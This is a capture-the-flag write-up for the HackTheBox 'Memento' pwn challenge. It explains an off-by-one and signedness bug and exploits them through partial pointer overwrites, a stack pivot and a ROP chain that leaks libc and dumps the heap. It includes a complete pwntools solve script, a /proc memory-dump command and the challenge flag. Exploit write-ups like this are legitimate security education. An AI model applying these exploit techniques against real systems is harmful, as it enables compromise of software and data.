---
title: Memento
date: 2026-05-16 03:00:00 +0000
categories: [CTF, HackTheBox]
tags: [pwnable]
math: true
mermaid: true
media_subpath: /assets/posts/2026-05-16-memento
image:
  path: preview.png
---

## HackTheBox - Memento

### Background

I decided to work on the **Memento** pwn challenge on **Hack The Box** after it was recommended, especially since it was set to retire in just two days.

At first, I wasn't planning to spend too much time on it, but once I started digging into the challenge, I got completely hooked. Surprisingly, it ended up taking me a little over a day (in total) to finally solve.

### Overview

**Memento** is a hard-rated pwn challenge built around exploiting a single off-by-one vulnerability to achieve memory corruption.

The bug is eventually leveraged into a stack pivot, giving full control over the program's execution flow through a fairly involved ROP chain.

Unlike typical pwn challenges where achieving RCE is the final objective, the real goal here is to leak the flag directly from memory, where it resides on the heap.

### Program Analysis

We are given just a single file called **memento** which is a 64-bits executable.

```bash
mark@rwx:~/Desktop/Labs/HTB/Challenges/Memento$ file memento
memento: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=839f13e7ce5e7e34f16549d8d2cee2ce2004c537, for GNU/Linux 4.4.0, not stripped
mark@rwx:~/Desktop/Labs/HTB/Challenges/Memento$ checksec memento
[*] '/home/mark/Desktop/Labs/HTB/Challenges/Memento/memento'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
mark@rwx:~/Desktop/Labs/HTB/Challenges/Memento$ 
```

All protections are enabled on this binary.

Executing the binary doesn't reveal much on the program's behaviour

```bash
mark@rwx:~/Desktop/Labs/HTB/Challenges/Memento$ ./memento
asdf
ls
hello
lsls
mmm
c
^C
mark@rwx:~/Desktop/Labs/HTB/Challenges/Memento$ 
```

Loading it up in IDA Pro, here's the disassembly:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 i; // [rsp+10h] [rbp-40h]
  int v5; // [rsp+18h] [rbp-38h]
  mem_t v6; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v6.data = (char *)calloc(1uLL, 0x20uLL);
  if ( v6.data )
  {
    for ( i = 0LL; i < 0x20; ++i )
    {
      v5 = fgetc(stdin);
      if ( v5 == -1 )
        break;
      v6.data[i] = v5;
      if ( (char)v5 == '}' )
      {
        if ( !strncmp("HTB{", v6.data, 4uLL) )
        {
          v6.count = 0LL;
          v6.data = (char *)&v6;
          loop(&v6);
        }
        break;
      }
    }
    fputs("fatal: could not get flag\n", stderr);
  }
  else
  {
    fputs("fatal: could not alloc\n", stderr);
  }
  return 1;
}

void __fastcall __noreturn loop(mem_t *mem)
{
  int c; // [rsp+4h] [rbp-Ch]

  while ( 1 )
  {
    c = fgetc(stdin);
    if ( c == -1 )
      break;
    switch ( c )
    {
      case 'A':
        remember(mem);
        break;
      case 'B':
        recall(mem);
        break;
      case 'C':
        reset(mem);
        break;
      default:
        fputs(":(", stderr);
        break;
    }
  }
  fputs(":/", stderr);
  exit(2);
}


void __fastcall remember(mem_t *mem)
{
  char v2; // [rsp+0h] [rbp-10h]
  char c; // [rsp+7h] [rbp-9h]

  c = fgetc(stdin);
  if ( c <= 24 )
  {
    while ( c-- )
    {
      v2 = fgetc(stdin);
      if ( mem->count <= 0x18uLL )
      {
        *mem->data++ = v2;
        ++mem->count;
      }
    }
  }
}

void __fastcall recall(mem_t *mem)
{
  fwrite(mem, mem->count, 1uLL, stdout);
  fflush(stdout);
}

void __fastcall reset(mem_t *mem)
{
  mem->count = 0LL;
  mem->data = (char *)mem;
}
```

> `Note`: The shown pseudocode is what i already did reverse (the structure...)
{: .prompt-tip }

Here's the structure the program uses:

```c
00000000 struct mem_t // sizeof=0x28
00000000 {                                       // XREF: main/r
00000000     char v6[24];
00000018     __int64 count;                      // XREF: main:loc_14CC/w
00000020     char *data;                         // XREF: main+2B/w main+31/r ...
00000028 };
```

The main function first allocates a heap chunk using `calloc`. If the allocation succeeds, it reads user input into this chunk, up to a maximum of 0x20 bytes, matching the allocated size.

As input is processed, it checks for the closing brace `}` and validates the beginning of the flag against the flag format prefix `HTB{`. If the check passes, it sets `v6.count` to `0LL` and sets `v6.data` back to the start of the `mem_t` structure.

After this initialization, the loop function is invoked with a pointer to the `mem_t` structure.

The program then enters a while (true) loop, continuously reading input until `EOF (-1)` is encountered. Once `EOF` is received, the loop terminates and the program exits.

There are three main components that make up the program's loop functionality: `remember`, `recall`, and `reset`.

```c
void __fastcall remember(mem_t *mem)
{
  char v2; // [rsp+0h] [rbp-10h]
  char c; // [rsp+7h] [rbp-9h]

  c = fgetc(stdin);
  if ( c <= 24 )
  {
    while ( c-- )
    {
      v2 = fgetc(stdin);
      if ( mem->count <= 0x18uLL )
      {
        *mem->data++ = v2;
        ++mem->count;
      }
    }
  }
}
```

The `remember` function takes a pointer to a `mem_t` structure as its argument. It first reads a user-controlled value `c` using `fgetc()` and checks whether it is less than or equal to 24.

If the check passes, the function enters a loop that iterates `c` times. During each iteration, a byte is read from `stdin` and written to the buffer pointed to by `mem->data`, provided that `mem->count` is less than or equal to 24.

After every successful write:
- `mem->data` is incremented
- `mem->count` is incremented

The loop continues until `c` reaches 0.

The `recall` function takes a pointer to a `mem_t` structure as its argument and prints the contents stored in the structure up to `mem->count` bytes.

```c
void __fastcall recall(mem_t *mem)
{
  fwrite(mem, mem->count, 1uLL, stdout);
  fflush(stdout);
}
```

The `reset` function restores the internal state of the `mem_t` structure by reinitializing both its counter and data pointer:

```c
void __fastcall reset(mem_t *mem)
{
  mem->count = 0LL;
  mem->data = (char *)mem;
}
```

It sets `mem->count` to 0, effectively clearing any recorded length, and resets `mem->data` to point back to the beginning of the `mem_t` structure itself.


### Exploitation

As you might have already seen, there's not much this program has to offer..

The vulnerability is fairly straightforward:
- an off-by-one write
- a signedness bug in input validation

What can we do with the off-by-one write?

Well, recall the `mem_t` structure:

```c
struct mem_t {
  char v6[24];
  long count;
  char *data;
}
```

With an off-by-one we can corrupt the `count` field of the structure.

How useful and exploitable is this though? After all, the program does ensure that count never exceeds 24.

Well, the interesting part is that the program increments `mem->data` after every write:

```c
*mem->data++ = v2;
```

This means that if we somehow manage to make `mem->data` point to itself (&mem->data), we can start partially overwriting the pointer itself and gain control over where future writes go.

At that point, we essentially get writes on the stack, which leads directly to memory corruption.

Thinking about it, there are two major problems we run into:
- we can only read up to `c` times, and there's a check ensuring it doesn't exceed 24
- once `count` becomes greater than 0x18, the program stops writing to `data`

That's where the actual vulnerability comes into play.

There's a signedness bug during input validation:

```c
char c; // [rsp+7h] [rbp-9h]

c = fgetc(stdin);
if ( c <= 24 )
{
  while ( c-- ) {...}
}
```

`c` is defined as a signed char, meaning its range is `-128` to `127`.

Because of this, values such as `-128` still satisfy the condition:

```c
c <= 24
```

And this allows the loop to iterate far more times than intended.

Why this matters is because, to perform the final partial overwrite on `mem->data`, we need a total of 33 bytes to be processed...something that normally shouldn't be possible with the 24 byte limit in place.

With that in place, how do we bypass the `count` check?

Well, that part is actually pretty straightforward. We can simply keep overwriting `count` back to 0.

Since the comparison only checks whether `count` is less than or equal to `0x18`, resetting the lower byte to a small value keeps the check satisfied while the upper bytes remain `0`.

Before getting into the actual memory write primitive though, the first thing we need is leaks.

> The remote libc wasn't provided and my exploit ended up using a gadget in libc, so I created a primitive to let me leak libc on the remote to determine the libc in use.
{: .prompt-tip }

Looking at the function `recall`, we see that the amount of bytes printed is determined by `mem->count`

And because we can overwrite `count` via the off-by-one, we can set it `0xff-1` which ends up being `0xff` when incremented. 

Then leak memory using the function.

Here's the stack frame after setting `count` to `0xff`

![frame_one](frame_one.png)
![stack_one](stack_one.png)
![dump_one](dump_one.png)

The way to overwrite count is by first filling the buffer with 24 bytes.

Since the write pointer keeps incrementing across calls unless `reset` is triggered, we can simply perform another write with one extra byte, causing the next write to land directly on count and corrupt it.

Looking at the stack frame of the `main` function, we can see that there are various pointers (stack / pie / libc) on the stack.

I ended up getting all because they ended up being really useful for exploitation.

I wrote a gdb script (sm0g told me "noob" - crazy pwner fr) to help me easily parse the `mem_t` (even though it's not really a complicated structure lol)

```gdb
set print pretty on

define print_mem_t
    set $base = (char *)$arg0

    printf "====== mem_t @ %p ======\n", $base

    printf "v6:\n"
    x/24bx $base

    set $count = *(long *)($base + 24)
    printf "count : 0x%lx (%ld)\n", $count, $count

    set $data = *(char **)($base + 32)
    printf "data  : %p\n", $data

    printf "========================\n"
end
```

With leaks gotten, we can now advance with how to gain code execution (or so i thought 😂).

> I'll show you what I ended up doing to get code execution.. although it turned out that, we instead needed to leak the flag from the heap
{: .prompt-tip }

To get `RIP` control, we need to perform a partial overwrite of `mem->data` so it eventually points toward the return address of `remember`.

This is where things started to get messy for me, I didn't realize how the stack layout could be in practice, especially with alignment and shifting addresses (that cost me a good amount of time...my goodness!).

Sometimes the distance between the stack frame of `main` (where the struct lives) and `remember` would vary slightly, and even worse, `&mem->data` after increments wouldn't always end up being in the same address range.

In my opinion, it's best to just look at the layout of the stack on each run in memory to understand what I'm saying..

Anyways it's not a very reliable exploit but I added checks to make sure the constraints are satisfied before proceeding to the final exploit stage.

> Classic spray-and-pray literally! 😂
{: .prompt-tip }

One thing is that we can only reliably overwrite two QWORDs (16 bytes) at the return address, so I ended up using a stack pivot gadget that performs:

```c
"add rsp, 0x60",
"pop rbx",
"pop r14",
"pop rbp",
"ret"
```

This was mainly because of the overwrite limitation (obviously, hello?? 😏), so instead of trying to build a full ROP chain at the original return address, I pivoted the stack further down.

I didn't want the ROP chain getting clobbered on the stack mid-execution, so I went with that stack pivot gadget.

With that we're able to call `system('/bin/sh')` thereby getting a shell.

#### Arbitrary memory read ftw!

Getting the leak was actually pretty clean. Since I already had a pointer into the `ELF` section, that effectively gave me the base address.

For libc, the obvious target was the `GOT`.

I ended up using the stack corruption to overwrite `rbp-0x8` of the `loop` function to a fake `mem_t` structure (which resides in the GOT). 

```python
payload = build_stage_payload(
    loop_mem_t,
    p64(exe.address + 0x3f50)
)

reset()
remember(-128, payload)

io.send(b"B")
data = io.recv(0x3d78)
chunks = [
    hex(u64(data[i:i+8].ljust(8, b"\x00")))
    for i in range(0, len(data), 8)
]

print(chunks)
```

Remember that the program prints output based on `mem->count`, so I had to misalign the `GOT` in a way that `mem->count` effectively becomes `addr >> 40`.

From there, I used [libc.rip](https://libc.rip/) to identify the exact libc version running on the remote instance, and then proceeded to patch my local binary.

![libc_one](libc_one.png)
![libc](libc.png)

#### Where the heck is the flag?

It turned out the flag was actually placed on the heap during the service setup.

After getting a shell, I noticed the socat service was being spawned via a `run.sh` script.

![shell_one](shell_one.png)
![shell_two](shell_two.png)

> I'll be honest here, I got frustrated for hours trying to do privilege escalation (I even tried to use copy-fail but the host doesn't allow outbound connection. It was really a pain 😭 - [@McSam](https://themcsam.github.io/) can attest my suffering on this)
{: .prompt-tip }

Moving on, the next thing was to dump the heap contents, it turns out that the heap on the remote instance actually isn't at the same offset as the local one (got it with some bit of fuzzing)..

Btw, I tried to cheese the challenge by dumping the heap using `dd` since I could access the `/proc/${PID}/maps` but `ptrace_scope` was disabled 🥲.

```bash
dd if=/proc/${PID}/mem of=/tmp/dump.bin bs=1 skip=$((0x55678e7c9000)) count=$((0x55678e7ea000 - 0x55678e7c9000)) status=progress
```

Well, I ended up going back to ROP. To stay on the safe side with all the stack weirdness and a bit of restricted write, I used a `gets()` call to get an unbounded write, which let me further corrupt the return address and build a proper chain to dump the heap contents - smart I'd say 😏

I was so tired I ended up doing a full ROP with the following end goal:
- retrieved `top_chunk` from `main_arena.top`
- call `write(1, top_chunk-offset_to_base, 0x2100)`

It would have been easier to make a ROP chain to just `mprotect()` the `bss`, `read()` to it and jump to it xD

> An issue that occurred with `gets()` was that the `pop rsi` gadget contained a newline character which made the call to `gets` stop. I didn't realize on time and almost went insane.. but the fix was to use a varient of it and assert the payload doesn't contain `\n`

Well, that's all 😎

Here's my final solve script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('memento_patched')
libc = ELF("./libc6_2.39-0ubuntu8.7_amd64.so")

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
source mem.gdb
brva 0x1252
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def remember(count, data):
    io.send(b"A")
    io.send(p8(count, signed=True))
    io.send(data)

def recall():
    io.send(b"B")

    io.recvuntil(b"A" * 24)
    data = io.recv(0xff)

    return [
        u64(data[i:i+8].ljust(8, b"\x00"))
        for i in range(0, len(data), 8)
    ]

def reset():
    io.send(b"C")

def build_stage_payload(target, chain, size=128):
    payload  = b"B" * 24
    payload += p8(0x0)
    payload += p8(0) * 7
    payload += p8((target - 1) & 0xff)
    payload += chain

    return payload.ljust(size, b"A")

def solve():

    io.send(b"HTB{AAAAAAAA}")

    remember(24, b"A" * 24)
    remember(1, p8(0xff - 1))

    chunks = recall()
    libc_leak = chunks[4]
    stack_leak = chunks[3]
    exe.address = chunks[-1] - exe.sym["main"]
    libc.address = libc_leak - 0x2a1ca

    info("libc base: %#x", libc.address)
    info("elf base: %#x", exe.address)

    return_addr = stack_leak - 0x118
    mem_t_obj   = stack_leak - 0xd0
    rop_stack   = stack_leak - 0x98
    loop_mem_t  = stack_leak - 0x108
    
    info(f"return addr : {hex(return_addr)}")
    info(f"mem_t object: {hex(mem_t_obj)}")
    info(f"rop stack   : {hex(rop_stack)}")
    info(f"loop mem_t  : {hex(loop_mem_t)}")

    rop = ROP(libc)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
    pop_rdx = libc.address + 0x144a1a # pop rdx ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret

    pivot = rop.find_gadget([
        "add rsp, 0x60",
        "pop rbx",
        "pop r14",
        "pop rbp",
        "ret"
    ])[0]

    info(f"pivot gadget: {hex(pivot)}")

    stage1_chain = flat(
        pop_rdi,
        mem_t_obj + 0x50,
    )

    payload = build_stage_payload(
        rop_stack,
        stage1_chain
    )

    reset()
    remember(-128, payload)

    stage2_chain = flat(
        libc.sym["gets"],
        mem_t_obj + 0x50
    )

    payload = build_stage_payload(
        rop_stack + 0x10,
        stage2_chain
    )

    reset()
    remember(-128, payload)

    # hope for stack to be alligned lmao 
    data_ptr_nibble = ((mem_t_obj + 0x20) & 0xf00) >> 8
    current_nibble  = (mem_t_obj & 0xf00) >> 8

    if current_nibble != data_ptr_nibble:
        warning("[1] stack alignment failed")
        io.close()

    if (return_addr  & ~0xff) != (mem_t_obj & ~0xff):
        warning("[2] stack alignment failed")
        io.close()

    payload = build_stage_payload(
        return_addr,
        p64(pivot)
    )

    reset()
    remember(-128, payload)

    pop_rdi = libc.address + 0x10f78b # pop rdi ; ret
    pop_rdx = libc.address + 0xab8a1 # pop rdx ; or byte ptr [rcx - 0xa], al ; ret
    pop_rcx = libc.address + 0xa877e # pop rcx ; ret
    pop_rsi_r15 = libc.address + 0x10f789 # pop rsi ; pop r15 ; ret
    pop_rbp = libc.address + 0x28a91 # pop rbp ; ret
    add_rdx_rdi = libc.address + 0x18e027 # add rdx, rdi ; lea rax, [rdx + rax*4] ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
    read_write_gadget = libc.address + 0xbf450 # mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
    mov_rax_rdi = libc.address + 0x96ca5 # mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
    mov_rsi_rax = libc.address + 0x183a82 # mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
    bss = exe.address + 0x4510
    size = 0x2100
    
    payload = flat(
        [
            pop_rdi,
            bss,
            pop_rsi_r15,
            libc.address + 0x203b20,
            0x0,
            read_write_gadget,
            pop_rcx,
            0x0,
            pop_rdi,
            -size,
            add_rdx_rdi,
            pop_rdi,
            bss+0x100,
            read_write_gadget+3,
            pop_rcx,
            bss+0x10,
            pop_rdx,
            bss+0x50,
            pop_rdi,
            bss+0x100,
            mov_rax_rdi,
            pop_rcx,
            0x0,
            mov_rsi_rax,
            pop_rdi,
            1,
            pop_rcx,
            bss+0x10,
            pop_rdx,
            size,
            libc.sym["write"],
        ]
    )
    
    # print(hexdump(payload))
    assert b"\n" not in payload

    io.sendline(payload)

    io.interactive()


def main():      
    init()
    solve()
            
            
if __name__ == '__main__':
    main()
```

Running it works:

![flag](flag.png)


#### FLAG

```
HTB{n0w_wh3re_w4s_1}
```